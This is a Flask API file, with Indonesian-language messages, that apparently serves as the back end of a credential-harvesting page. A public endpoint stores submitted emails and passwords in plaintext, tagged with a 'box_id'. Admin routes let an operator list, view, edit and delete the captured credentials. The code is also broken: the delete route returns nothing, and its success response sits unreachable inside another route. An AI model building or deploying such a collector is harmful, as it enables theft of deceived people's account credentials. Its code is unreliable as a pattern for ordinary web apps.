from flask import Blueprint, request, jsonify, session
from app.models import UserSubmission, AdminUser
from app import db

api_bp = Blueprint('api', __name__)


@api_bp.route('/submit', methods=['POST'])
def submit():
    data     = request.get_json()
    email    = (data.get('email') or '').strip()
    password = (data.get('password') or '').strip()
    box_id   = data.get('box_id', 0)

    if not email or not password:
        return jsonify({'status': 'error', 'message': 'Email dan password wajib diisi.'}), 400

    entry = UserSubmission(email=email, password=password, box_id=box_id)
    db.session.add(entry)
    db.session.commit()

    return jsonify({'status': 'ok', 'message': 'Data berhasil disimpan.', 'id': entry.id}), 201

@api_bp.route('/admin/login', methods=['POST'])
def admin_login():
    data = request.get_json(force=True, silent=True)

    if not data:
        return jsonify({'status': 'error', 'message': 'Body harus JSON.'}), 400

    if AdminUser.verify(data.get('username', ''), data.get('password', '')):
        session['admin_logged_in'] = True
        return jsonify({'status': 'ok', 'message': 'Login berhasil.'})

    return jsonify({'status': 'error', 'message': 'Kredensial salah.'}), 401

@api_bp.route('/admin/users', methods=['GET'])
def admin_users():
    if not session.get('admin_logged_in'):
        return jsonify({'status': 'error', 'message': 'Unauthorized.'}), 401

    users = UserSubmission.query.order_by(UserSubmission.created_at.desc()).all()
    return jsonify({'status': 'ok', 'data': [u.to_dict() for u in users]})


@api_bp.route('/admin/users/<int:user_id>', methods=['PUT'])
def admin_edit(user_id):
    if not session.get('admin_logged_in'):
        return jsonify({'status': 'error', 'message': 'Unauthorized.'}), 401

    entry = UserSubmission.query.get_or_404(user_id)
    data  = request.get_json()

    new_email    = (data.get('email') or '').strip()
    new_password = (data.get('password') or '').strip()

    if not new_email or not new_password:
        return jsonify({'status': 'error', 'message': 'Email dan password tidak boleh kosong.'}), 400

    entry.email    = new_email
    entry.password = new_password
    db.session.commit()

    return jsonify({'status': 'ok', 'message': 'Data diperbarui.', 'data': entry.to_dict()})


@api_bp.route('/admin/users/<int:user_id>', methods=['DELETE'])
def admin_delete(user_id):
    if not session.get('admin_logged_in'):
        return jsonify({'status': 'error', 'message': 'Unauthorized.'}), 401

    entry = UserSubmission.query.get_or_404(user_id)
    db.session.delete(entry)
    db.session.commit()


@api_bp.route('/admin/users/<int:user_id>', methods=['GET'])
def admin_get_user(user_id):
    if not session.get('admin_logged_in'):
        return jsonify({'status': 'error', 'message': 'Unauthorized.'}), 401

    entry = UserSubmission.query.get_or_404(user_id)
    return jsonify({'status': 'ok', 'data': entry.to_dict()})

    return jsonify({'status': 'ok', 'message': 'Data dihapus.'})